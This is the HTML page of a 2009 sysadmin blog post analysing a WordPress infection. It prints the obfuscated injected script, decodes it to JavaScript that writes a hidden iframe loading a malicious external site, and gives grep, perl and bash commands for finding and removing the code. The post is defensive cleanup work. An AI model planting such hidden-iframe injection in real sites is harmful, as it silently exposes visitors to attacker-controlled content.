
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>HEUR:Trojan.Script.Iframe - Linux Sysadmin Blog</title>
  <meta name="author" content="Promet OPS Team">

  
  <meta name="description" content="One of my friend asked for help about virus appearing on his sites (mostly WordPress sites).  I checked it out and my Kaspersky Internet Security &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Linux Sysadmin Blog" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

<!-- Google Form for Contact Page -->
<!-- jQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript">
    // Avoid conflict with ender.js.
jQuery.noConflict();
</script>
<!-- jQuery Form Plugin -->
<script src="http://malsup.github.com/jquery.form.js"></script>
<script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js"></script> 
<script src="/javascripts/google_form.js"></script>
<!-- Google Form for Contact Page End here -->


  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-120251-38']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Linux Sysadmin Blog</a></h1>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:linuxsysadminblog.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/our-team">Our Team</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/blog/about">About</a></li>
  <li><a href="/blog/contact">Contact</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      

<div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">HEUR:Trojan.Script.Iframe</h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/gerold-mercadero.html">Gerold Mercadero</a></span></span>

 - 








  


<time datetime="2009-03-22T12:25:15+08:00" pubdate data-updated="true">Mar 22<span>nd</span>, 2009</time>
        
         | <a href="#disqus_thread">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>One of my friend asked for help about virus appearing on his sites (mostly WordPress sites).  I checked it out and my Kaspersky Internet Security blocked the pages from loading, so i downloaded the files manually and scanned html with Kaspersky to determine affected files.</p>

<p><img src="http://linuxsysadminblog.com/images/2009/03/virus2-220x300.gif" alt="virus2" /></p>

<p>I noticed that the affected files were PHP and HTML only and if you compare the code of the original WordPress files with the infected one you will see the difference.  Below are sample added codes/virus:</p>

<p>HTML files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type="text/javascript"&gt;eval(String.fromCharCode(118,97...50,55))&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>PHP files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php echo '&lt;script type="text/javascript"&gt;eval(String.fromCharCode(118,97...50,55))&lt;/script&gt;'; ?&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>What it does</strong></p>

<p>I&#8217;m not a virus expert and I&#8217;m curios on what this portion of code does so i looked at it.  In our case the resulting text add this portion of code to the html or php files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var fggge3="si";
</span><span class='line'>var w345="pl";
</span><span class='line'>var re6="ank.";
</span><span class='line'>var rr="com";
</span><span class='line'>var a="if";
</span><span class='line'>var s="tt";
</span><span class='line'>document.write('&lt;'+a+'rame src="h'+s+'p://'+fggge3+''+w345+''+re6+''+rr+'/'+'qqp/'+''+''+'" style="d'+'isplay:n'+'one"&gt;');
</span><span class='line'>var t=00001217</span></code></pre></td></tr></table></div></figure>


<p>and you can see it tries to load an iframe:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;iframe src=http://siplank.com/qqp/ style=display:none&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>Virus Removal</strong></p>

<p>You can remove the virus by just deleting the code (sample above) on the affected files.  If you need to cleanup hundred of infected files (in our case more than 800) you can do the following:</p>

<ul>
<li>Get the list of infected files.  You can use grep to search for them</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -Z -R "eval(String.fromCharCode(118,97,114" /path/to/site/* &gt;&gt; affected_file_list.txt</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Delete the codes by using perl/sed commands.  Repeat the commands for every files.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl -pi -e 's/\&lt;script type="text\/javascript"\&gt;eval\(String.fromCharCode\(118,97,114...51,51\)\)\&lt;\/script\&gt;//'  /path/to/affected/file.htm
</span><span class='line'>perl -pi -e "s/\&lt;\?php echo ''; \?\&gt;\&lt;\?php echo ''; \?\&gt;//"  /path/to/affected/file.php</span></code></pre></td></tr></table></div></figure>


<p>Or create a bash/shell script to do the cleanup at once:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>while read line
</span><span class='line'>do
</span><span class='line'>perl -pi -e 's/\&lt;script type="text\/javascript"\&gt;eval\(String.fromCharCode\(118,97,114...51,51\)\)\&lt;\/script\&gt;//'  $line
</span><span class='line'>perl -pi -e "s/\&lt;\?php echo ''; \?\&gt;\&lt;\?php echo ''; \?\&gt;//"   $line
</span><span class='line'>done &lt; affected_file_list.txt</span></code></pre></td></tr></table></div></figure>


<p>That&#8217;s all.</p>

<p>I don&#8217;t know how the attacker gained access to the files and inserted the codes because the file permissions are ok - maybe they gain ftp access.</p>
</div>


  <footer>
    <p class="meta">
      
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/gerold-mercadero.html">Gerold Mercadero</a></span></span>


      








  


<time datetime="2009-03-22T12:25:15+08:00" pubdate data-updated="true">Mar 22<span>nd</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='/category/news/'>News</a>, <a class='category' href='/category/security/'>Security</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/" data-via="linuxsysadmnblg" data-counturl="http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/" >Tweet</a>
  
  
  
    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/2009/03/asa-allow-passive-ftp-traffic/" title="Previous Post: ASA allow passive ftp traffic">&laquo; ASA allow passive ftp traffic</a>
      
      
        <a class="basic-alignment right" href="/2009/03/remove-passphrase-from-private-key/" title="next Post: Remove passphrase from private key">Remove passphrase from private key &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/2012/11/howto-bulk-import-dns-zones-to-softlayer-dns-using-cpanel/">HowTo: Bulk Import DNS Zones to Softlayer DNS using Cpanel</a>
      </li>
    
      <li class="post">
        <a href="/2012/08/integrate-sendgrid-with-redmine/">Integrate Sendgrid with Redmine</a>
      </li>
    
      <li class="post">
        <a href="/2012/07/rsback-task-x-is-locked-and-cannot-be-executed/">rsback: task x is locked and cannot be executed</a>
      </li>
    
      <li class="post">
        <a href="/2012/06/restore-xen-vm-from-lvm-snapshot-backups/">Restore Xen VM from LVM Snapshot Backups</a>
      </li>
    
      <li class="post">
        <a href="/2012/06/debian-6-backup-xen-with-lvm-and-rsnapshot/">Debian 6: Backup Xen with LVM and Rsnapshot</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/promet">@promet</a> on GitHub
  
  <script type="text/javascript">
    $.domReady(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'promet',
            count: 0,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <li class="loading">Status updating...</li>
  </ul>
  <script type="text/javascript">
    $.domReady(function(){
      getTwitterFeed("linuxsysadmnblg", 4, false);
    });
  </script>
  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
  
    <a href="http://twitter.com/linuxsysadmnblg" class="twitter-follow-button" data-show-count="false">Follow @linuxsysadmnblg</a>
  
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2012 - Promet OPS Team -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'linuxsysadminblog';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/';
        var disqus_url = 'http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>





  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
